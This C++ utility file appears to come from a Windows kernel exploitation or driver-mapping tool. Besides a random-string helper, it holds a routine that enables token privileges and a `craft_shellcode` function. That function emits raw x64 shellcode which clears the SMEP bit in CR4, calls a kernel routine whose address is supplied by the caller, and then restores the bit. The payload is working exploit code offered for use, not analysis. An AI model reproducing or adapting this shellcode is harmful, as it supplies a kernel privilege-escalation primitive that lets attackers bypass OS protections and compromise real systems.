#include "../../common.hpp"

std::string c_util::random_string(std::string::size_type size)
{
    static auto& chrs = "0123456789"
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    thread_local static std::mt19937 rg{ std::random_device{}() };
    thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);

    std::string s;

    s.reserve(size);

    while (size--) s += chrs[pick(rg)];

    return s;
}

void c_util::grant_privileges(const std::vector<std::wstring_view> names) {
	TOKEN_PRIVILEGES Priv, PrivOld;
	DWORD cbPriv = sizeof(PrivOld);
	HANDLE token;

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, FALSE, &token)) {
		if (GetLastError() != ERROR_NO_TOKEN)
			return;
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token))
			return;
	}

	Priv.PrivilegeCount = 1;
	Priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	for (auto& name : names) {
		LookupPrivilegeValueW(NULL, name.data(), &Priv.Privileges[0].Luid);

		AdjustTokenPrivileges(token, FALSE, &Priv, sizeof(Priv), &PrivOld, &cbPriv);
	}
}

c_shellcode c_util::craft_shellcode(uint64_t mm_get, uint64_t ke_set_affinity, uint64_t ke_query_affinity)
{
	c_shellcode shell;

	shell.make
	(
		0x4C, 0x89, 0x4C, 0x24, 0x20,
		0x4C, 0x89, 0x44, 0x24, 0x18,
		0x48, 0x89, 0x54, 0x24, 0x10,
		0x48, 0x89, 0x4C, 0x24, 0x08,
		0x48, 0x83, 0xEC, 0x68,
		0x48, 0xB8, ke_query_affinity,
		0x48, 0x89, 0x44, 0x24, 0x28,
		0x48, 0xB8, ke_set_affinity,
		0x48, 0x89, 0x44, 0x24, 0x20,
		0x48, 0xB8, mm_get,
		0x48, 0x89, 0x44, 0x24, 0x38,
		0x48, 0x8B, 0x44, 0x24, 0x28,
		0xFF, 0xD0,
		0x48, 0x89, 0x44, 0x24, 0x48,
		0x48, 0x8B, 0x44, 0x24, 0x20,
		0x48, 0x89, 0x44, 0x24, 0x30,
		0xB9, 0x01, 0x00, 0x00, 0x00,
		0xFF, 0x54, 0x24, 0x30,
		0x0F, 0x20, 0xE0,
		0x48, 0x0F, 0xBA, 0xF0, 0x14,
		0x0F, 0x22, 0xE0,
		0x48, 0x8B, 0x44, 0x24, 0x70,
		0x48, 0x89, 0x44, 0x24, 0x40,
		0x48, 0x8B, 0x4C, 0x24, 0x38,
		0xFF, 0x54, 0x24, 0x40,
		0x0F, 0x20, 0xE0,
		0x48, 0x0F, 0xBA, 0xE8, 0x14,
		0x0F, 0x22, 0xE0,
		0x48, 0x8B, 0x44, 0x24, 0x20,
		0x48, 0x89, 0x44, 0x24, 0x50,
		0x48, 0x8B, 0x4C, 0x24, 0x48,
		0xFF, 0x54, 0x24, 0x50,
		0xB0, 0x01,
		0x48, 0x83, 0xC4, 0x68,
		0xC3,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC
	);

	return shell;
}